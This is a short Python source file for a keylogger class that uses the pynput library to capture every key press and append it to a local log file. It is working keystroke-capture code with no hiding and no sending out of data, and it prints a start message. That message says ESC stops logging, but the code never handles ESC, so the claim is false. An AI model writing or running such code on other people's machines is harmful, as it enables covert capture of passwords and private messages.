from pynput import keyboard
from datetime import datetime

class KeyLogger:

    def __init__(self, log_file="logs/keylog.txt"):
        self.log_file = log_file

    def write_to_file(self, key):

        key = str(key).replace("'", "")

        if key == "Key.space":
            key = " "
        elif "Key" in key:
            key = f"[{key}]"

        with open(self.log_file, "a") as f:
            f.write(key)

    def on_press(self, key):
        self.write_to_file(key)

    def start(self):
        print("Keylogger started... Press ESC to stop.")

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
